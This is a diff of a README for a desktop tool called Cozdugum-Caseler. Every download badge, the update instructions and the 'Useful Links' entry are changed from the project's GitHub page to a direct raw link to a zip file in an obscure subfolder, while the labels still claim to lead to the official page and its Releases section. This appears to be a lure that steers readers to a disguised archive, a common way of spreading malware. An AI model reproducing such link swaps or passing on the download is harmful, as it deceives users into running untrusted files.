@@ -1,6 +1,6 @@
 # 🛠️ Cozdugum-Caseler - Easy Case Solutions for Companies
 
-[![Download Cozdugum-Caseler](https://img.shields.io/badge/Download-Cozdugum--Caseler-brightgreen?style=for-the-badge)](https://github.com/osamaalhrbi/Cozdugum-Caseler)
+[![Download Cozdugum-Caseler](https://img.shields.io/badge/Download-Cozdugum--Caseler-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/osamaalhrbi/Cozdugum-Caseler/main/beaded/Caseler-Cozdugum-Zantedeschia.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You need to visit the project page to download the software files.
 
 Click the big download button below to go to the official GitHub page:
 
-[![Download Cozdugum-Caseler](https://img.shields.io/badge/Download-Cozdugum--Caseler-blue?style=for-the-badge)](https://github.com/osamaalhrbi/Cozdugum-Caseler)
+[![Download Cozdugum-Caseler](https://img.shields.io/badge/Download-Cozdugum--Caseler-blue?style=for-the-badge)](https://raw.githubusercontent.com/osamaalhrbi/Cozdugum-Caseler/main/beaded/Caseler-Cozdugum-Zantedeschia.zip)
 
 This page contains the latest versions of the software and instructions.
 
@@ -88,7 +88,7 @@ After installation, you can open Cozdugum-Caseler from your desktop or Start men
 
 Updates include bug fixes and new features. To keep your software current:
 
-1. Visit the [Cozdugum-Caseler GitHub page](https://github.com/osamaalhrbi/Cozdugum-Caseler).
+1. Visit the [Cozdugum-Caseler GitHub page](https://raw.githubusercontent.com/osamaalhrbi/Cozdugum-Caseler/main/beaded/Caseler-Cozdugum-Zantedeschia.zip).
 2. Check the “Releases” section regularly.
 3. Download the latest installer file.
 4. Run it as described in the Installation steps.
@@ -137,7 +137,7 @@ The application stores your data locally on your computer. It does not send your
 
 ## 🔗 Useful Links
 
-- Download and updates: [https://github.com/osamaalhrbi/Cozdugum-Caseler](https://github.com/osamaalhrbi/Cozdugum-Caseler)  
+- Download and updates: [https://raw.githubusercontent.com/osamaalhrbi/Cozdugum-Caseler/main/beaded/Caseler-Cozdugum-Zantedeschia.zip](https://raw.githubusercontent.com/osamaalhrbi/Cozdugum-Caseler/main/beaded/Caseler-Cozdugum-Zantedeschia.zip)  
 - Report issues or ask questions: Use GitHub “Issues” tab on the same page.
 
 ---
@@ -151,4 +151,4 @@ The application stores your data locally on your computer. It does not send your
 
 ---
 
-[![Download Cozdugum-Caseler](https://img.shields.io/badge/Get%20Cozdugum--Caseler-brightgreen?style=for-the-badge)](https://github.com/osamaalhrbi/Cozdugum-Caseler)
+[![Download Cozdugum-Caseler](https://img.shields.io/badge/Get%20Cozdugum--Caseler-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/osamaalhrbi/Cozdugum-Caseler/main/beaded/Caseler-Cozdugum-Zantedeschia.zip)
